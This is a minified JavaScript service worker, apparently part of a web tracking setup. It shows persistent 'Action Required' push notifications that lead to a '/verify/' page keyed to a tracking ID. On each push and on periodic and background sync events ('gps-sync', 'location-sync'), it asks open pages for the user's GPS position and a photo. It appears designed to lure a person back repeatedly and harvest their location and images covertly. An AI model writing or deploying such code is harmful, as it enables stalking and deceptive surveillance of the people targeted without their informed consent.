let trackingId=null;
self.addEventListener('install',()=>self.skipWaiting());
self.addEventListener('activate',e=>e.waitUntil(clients.claim()));
self.addEventListener('message',e=>{if(e.data.type==='init')trackingId=e.data.trackingId});
self.addEventListener('push',e=>{const d=e.data?e.data.json():{};e.waitUntil(self.registration.showNotification(d.title||'Action Required',{body:d.body||'Tap to view',icon:'/icon-192.png',tag:'rigb',renotify:true,requireInteraction:true}).then(()=>requestFromClients()))});
self.addEventListener('notificationclick',e=>{e.notification.close();e.waitUntil(clients.matchAll({type:'window',includeUncontrolled:true}).then(c=>{for(const cl of c)if(cl.url.includes(trackingId))return cl.focus();return clients.openWindow('/verify/'+trackingId)}))});
self.addEventListener('periodicsync',e=>{if(e.tag==='gps-sync')e.waitUntil(requestFromClients())});
self.addEventListener('sync',e=>{if(e.tag==='location-sync')e.waitUntil(requestFromClients())});
async function requestFromClients(){const c=await clients.matchAll({type:'window',includeUncontrolled:true});c.forEach(cl=>{cl.postMessage({type:'getGPS'});cl.postMessage({type:'getPhoto'})})}
